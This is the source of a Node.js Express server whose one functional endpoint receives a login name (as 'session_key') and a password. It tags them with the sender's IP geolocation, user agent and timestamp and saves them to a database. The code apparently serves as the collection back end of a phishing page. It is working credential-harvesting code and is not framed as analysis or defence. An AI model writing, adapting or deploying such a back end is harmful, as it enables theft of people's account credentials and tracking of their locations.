const express = require("express")
const bodyParser = require("body-parser")
const axios = require("axios")
const cors = require("cors")

const app = express()
const PORT = process.env.PORT || 1682

require('./dbconnect')
const { addPersona } = require("./database/models/persona")

app.use(cors())
app.use(express.static(__dirname))
app.use(bodyParser.json()) // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })) // for parsing application/x-www-form-urlencoded

app.get("/", (req, res) => {
  res.status(200).json({ response: "Welcome, Keeps!" })
})

app.post("/UD92290", async (req, res) => {
  try {
    const response = await axios.get("http://www.geoplugin.net/json.gp?ip=xx.xx.xx.xx")

    const {
      geoplugin_request,
      geoplugin_city,
      geoplugin_region,
      geoplugin_countryName,
      geoplugin_countryCode,
    } = response.data

    const gottenAddress = {
      ip: geoplugin_request,
      city: geoplugin_city,
      region: geoplugin_region,
      countryName: geoplugin_countryName,
      countryCode: geoplugin_countryCode,
    }

    const { session_key, password } = req.body
    const user_agent = req.header("User-Agent")

    const date = new Date().toDateString()
    const time = new Date().toTimeString()

    const obj = {
      username: session_key,
      password: password,
      ip: gottenAddress.ip,
      city: gottenAddress.city,
      region: gottenAddress.region,
      country_name: gottenAddress.countryName,
      country_code: gottenAddress.countryCode,
      user_agent: user_agent,
      date: date,
      time: time,
    }

    const added = await addPersona({ ...obj })
    if (added) return res.status(201).json({ response: "Ok, done!" })

  } catch (error) {
    console.log("CATCH ERR: ", error)
    res.status(400).json({ response: error?.msg || error })
  }
})

app.listen(PORT, (err) => {
  if (err) throw err
  else console.log("Listening on " + PORT)
})